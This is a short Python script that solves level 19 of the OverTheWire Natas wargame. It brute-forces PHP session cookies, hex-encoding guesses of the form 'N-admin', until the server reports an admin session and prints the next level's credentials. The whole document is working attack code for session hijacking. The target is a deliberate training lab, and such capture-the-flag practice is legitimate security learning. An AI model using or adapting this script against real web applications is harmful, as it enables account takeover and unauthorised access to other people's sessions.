import requests

auth = ("natas19", "[PW_HERE]")
url = "http://natas19.natas.labs.overthewire.org"
max_id = 640

for i in range(max_id):
	raw_session = f"{i}-admin"
	encoded_session = raw_session.encode().hex()
	cookies = {"PHPSESSID": encoded_session}
	
	response = requests.get(url, auth=auth, cookies=cookies)
	
	
	if "You are an admin. The credentials for the next level are:" in response.text:
		print(f"[+] Found admin session cookie: {i}")
		print(f"[+] Cookie found: (PHPSESSID: {encoded_session})")
		print(response.text)
		break
		
	else:
		print(f"[*] Tried session ID {i} ({encoded_session})")
